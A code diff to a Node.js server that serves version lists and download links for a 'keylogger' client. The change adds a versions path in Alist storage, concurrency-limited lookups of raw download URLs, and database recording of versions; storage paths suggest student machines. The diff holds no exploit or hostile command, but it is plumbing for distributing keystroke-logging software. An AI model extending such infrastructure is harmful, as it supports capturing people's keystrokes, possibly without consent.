@@ -148,6 +148,7 @@ const CONFIG = {
     alist: {
         url: process.env.ALIST_URL,
         basePath: process.env.ALIST_BASE_PATH || '/学生目录/log',
+        versionPath: process.env.ALIST_VERSION_PATH || '/学生目录/versions',
         username: process.env.ALIST_USERNAME,
         password: process.env.ALIST_PASSWORD,
         tokenRefreshMargin: 5 * 60 * 1000,
@@ -1401,12 +1402,13 @@ app.get('/api/clients', (req, res) => {
 app.get('/api/update/get_version', asyncHandler(async (req, res) => {
     try {
         logger.info('开始获取版本列表');
-        // 从alist获取文件列表
+        // 使用版本专用路径
+        const versionPath = CONFIG.alist.versionPath;
         let allFiles = [];
         try {
-            logger.info(`尝试从 Alist 获取文件列表，路径: ${alistClient.basePath}`);
-            allFiles = await alistClient.listFiles(alistClient.basePath);
-            logger.info(`成功获取 Alist 文件列表，共 ${allFiles.length} 个文件`);
+            logger.info(`尝试从 Alist 获取文件列表，路径: ${versionPath}`);
+            allFiles = await alistClient.listFiles(versionPath);
+            logger.info(`成功获取 Alist 文件列表，共 ${allFiles.length} 个文件: ${allFiles.map(f => f.filename).join(', ')}`);
         } catch (alistError) {
             logger.warn('Alist 连接失败，返回空版本列表', { error: alistError.message });
             return res.json({
@@ -1419,7 +1421,6 @@ app.get('/api/update/get_version', asyncHandler(async (req, res) => {
         }
         
         // 过滤出keylogger应用程序文件（假设文件名包含keylogger且为可执行文件）
-        logger.info(`开始过滤 keylogger 应用程序文件`);
         const keyloggerFiles = allFiles.filter(file => 
             file.filename.toLowerCase().includes('keylogger') && 
             (file.filename.endsWith('.exe') || file.filename.endsWith('.zip'))
@@ -1428,24 +1429,34 @@ app.get('/api/update/get_version', asyncHandler(async (req, res) => {
         
         // 提取版本号并生成下载链接
         const versions = [];
-        for (const file of keyloggerFiles) {
-            // 从文件名提取版本号，假设格式为 keylogger_v1.0.0.exe 或类似
+        const limit = pLimit(5); // 限制并发请求，避免过多API调用
+        const tasks = keyloggerFiles.map(file => limit(async () => {
             const versionMatch = file.filename.match(/v(\d+\.\d+\.\d+)/i);
             if (versionMatch) {
                 const version = versionMatch[1];
-                const downloadUrl = `${alistClient.baseUrl}/d${alistClient.basePath}/${encodeURIComponent(file.filename)}`;
-                logger.info(`提取到版本: ${version}，文件名: ${file.filename}`);
-                
-                // 尝试将版本信息存入数据库
+                // 生成下载链接：优先使用 Alist API 获取 raw_url
+                const fullPath = `${versionPath}/${file.filename}`;
+                let downloadUrl = '';
                 try {
-                    // 检查数据库中是否已存在该版本
+                    const info = await alistClient._request('GET', `/api/fs/get?path=${encodeURIComponent(fullPath)}`);
+                    if (info.code === 200 && info.data && info.data.raw_url) {
+                        downloadUrl = info.data.raw_url;
+                        logger.info(`获取下载链接成功: ${downloadUrl}`);
+                    } else {
+                        downloadUrl = `${CONFIG.alist.url}/d${versionPath}/${encodeURIComponent(file.filename)}`;
+                        logger.warn(`无法获取raw_url，使用构造链接: ${downloadUrl}`);
+                    }
+                } catch (error) {
+                    downloadUrl = `${CONFIG.alist.url}/d${versionPath}/${encodeURIComponent(file.filename)}`;
+                    logger.warn(`获取下载链接失败，使用构造链接: ${downloadUrl}`, { error: error.message });
+                }
+                // 尝试将版本信息存入数据库（保持不变）
+                try {
                     const existingRows = await executeWithRetry(
                         'SELECT id FROM client_versions WHERE version = ?',
                         [version]
                     );
-                    
                     if (existingRows.length === 0) {
-                        // 插入新版本
                         await executeWithRetry(
                             'INSERT IGNORE INTO client_versions (version, download_url, is_active, force_update) VALUES (?, ?, ?, ?)',
                             [version, downloadUrl, false, false]
@@ -1458,11 +1469,18 @@ app.get('/api/update/get_version', asyncHandler(async (req, res) => {
                     logger.warn('数据库操作失败，继续处理', { error: dbError.message });
                 }
                 
-                versions.push({ version, downloadUrl, filename: file.filename });
+                return { version, downloadUrl, filename: file.filename };
             } else {
                 logger.info(`无法从文件名 ${file.filename} 中提取版本号`);
+                return null;
             }
-        }
+        }));
+        const results = await Promise.allSettled(tasks);
+        results.forEach(result => {
+            if (result.status === 'fulfilled' && result.value) {
+                versions.push(result.value);
+            }
+        });
         
         logger.info(`版本列表生成完成，共 ${versions.length} 个版本`);
         return res.json({
@@ -2231,7 +2249,7 @@ app.get('/api/config', asyncHandler(async (req, res) => {
 
 // 获取 Alist 文件列表
 app.get('/api/alist/files', asyncHandler(async (req, res) => {
-    const path = req.query.path || '/学生目录/软件/键盘记录器';
+    const path = req.query.path || CONFIG.alist.versionPath;
     try {
         const files = await alistClient.listFiles(path);
         // 只过滤 .exe 文件
